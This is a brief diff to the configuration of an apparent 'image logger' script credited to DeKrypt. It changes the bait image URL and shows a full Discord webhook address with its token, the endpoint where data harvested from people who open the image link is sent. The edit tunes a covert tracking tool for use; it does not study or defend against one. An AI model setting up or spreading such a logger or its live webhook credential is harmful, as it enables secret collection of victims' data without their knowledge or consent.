@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1113453664414216223/i8Rw9RlKVyU4f5-VjASKdiOgVWU1B1dqNbSJjDPrrs3yCOKlA6hwdpVljHG66dRystqf",
-    "image": "https://images.bonanzastatic.com/afu/images/d077/a7a5/a8c0_6912278930/s-l1600.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://webstockreview.net/images/cobra-clipart-sticker-7.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
